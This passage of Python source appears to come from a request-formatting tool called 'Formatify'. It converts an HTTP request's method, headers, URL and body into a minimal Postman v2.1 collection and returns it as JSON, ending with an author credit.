                except:
                    body_obj = {"mode": "raw", "raw": body}
            else:
                body_obj = {"mode": "raw", "raw": body}

        # Build request object
        request_obj = {
            "method": method,
            "header": pm_headers,
            "url": url
        }
        if body_obj:
            request_obj["body"] = body_obj

        # Build minimal collection
        collection = {
            "info": {
                "name": "Formatify Export",
                "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
                "_postman_id": "00000000-0000-0000-0000-000000000000"
            },
            "item": [
                {
                    "name": method + " " + url,
                    "request": request_obj
                }
            ]
        }

        return json.dumps(collection, indent=2)

        # Made with Love by Sid Joshi
        # Find me at Linkedin: https://www.linkedin.com/in/sid-j0shi/
